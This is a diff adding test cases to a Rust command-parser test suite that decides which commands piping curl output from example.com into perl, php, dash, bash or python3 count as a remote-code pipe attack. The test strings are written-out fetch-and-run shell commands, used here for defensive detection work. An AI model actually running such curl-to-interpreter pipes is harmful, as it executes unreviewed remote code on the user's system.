@@ -99,6 +99,8 @@ fn interpreter_options_are_read_per_family_before_the_program() {
         "curl -sL https://example.com/x | ruby -r json",
         "curl -sL https://example.com/x | node -r ./preload.js",
         "curl -sL https://example.com/x | perl -MJSON",
+        "curl -sL https://example.com/x | perl -M strict",
+        "curl -sL https://example.com/x | php -- arg",
         "curl -sL https://example.com/x | perl -c",
         "curl -sL https://example.com/x | php -c php.ini",
         "curl -sL https://example.com/x | bash -- -",
@@ -124,6 +126,9 @@ fn version_help_and_script_operands_do_not_read_a_program_from_stdin() {
         "curl -s https://example.com/x | php -R 'echo 1;'",
         "curl -s https://example.com/x | bash -- script.sh",
         "curl -s https://example.com/x | bash -O extglob script.sh",
+        "curl -s https://example.com/x | dash -O extglob",
+        "curl -s https://example.com/x | dash --rcfile rc.sh",
+        "curl -s https://example.com/x | python3 -- script.py",
     ] {
         let model = parse_command(&request(command)).unwrap();
         assert_eq!(pipe_attack(&model), None, "{command}");
